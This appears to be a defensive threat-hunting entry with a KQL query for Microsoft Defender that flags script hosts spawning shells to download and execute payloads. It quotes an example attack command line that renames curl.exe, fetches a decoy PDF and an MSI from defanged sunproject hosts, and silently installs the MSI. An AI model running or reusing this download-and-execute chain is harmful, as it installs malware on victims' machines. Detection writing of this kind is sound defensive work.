# Day 7 - Script launching PowerShell to download and execute a payload

## Description

The following pseudo-detection analytic will identify wscript, cscript, or mshta launching PowerShell to download and execute a payload. Threats like Saffron Starling abuse this cmdlet to download and launch malicious code. Note that this cmdlet can be used legitimately for maintenance tasks and device administration, so you may need to investigate further to determine if the activity is evil. Childprocs and filemods to suspicious directories can be signs of successful payload execution.

### Example Script

```
"C:\Windows\System32\cmd.exe" /c cd /d "C:\Users\user\AppData\Local\Temp\" & copy c:\windows\system32\curl.exe TNheBOJElq.exe & TNheBOJElq.exe -o "C:\Users\user\Documents\QMQjaBdqIo.pdf" hxxps://bologna.sunproject[.]dev/download/pdf & "C:\Users\user\Documents\QMQjaBdqIo.pdf" & TNheBOJElq.exe -o bLhLldebqq.msi hxxps://rome.sunproject[.]dev/download/agent & C:\Windows\System32\msiexec.exe /i bLhLldebqq.msi /qn
```

## References
https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2025/

## Query MDE

``` KQL

DeviceProcessEvents
| where InitiatingProcessParentFileName has_any ("wscript.exe", "cscript.exe", "mshta.exe") and InitiatingProcessFileName has_any ("cmd.exe", "powershell.exe") and ProcessCommandLine has_any ("invoke_webrequest")
| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine

```
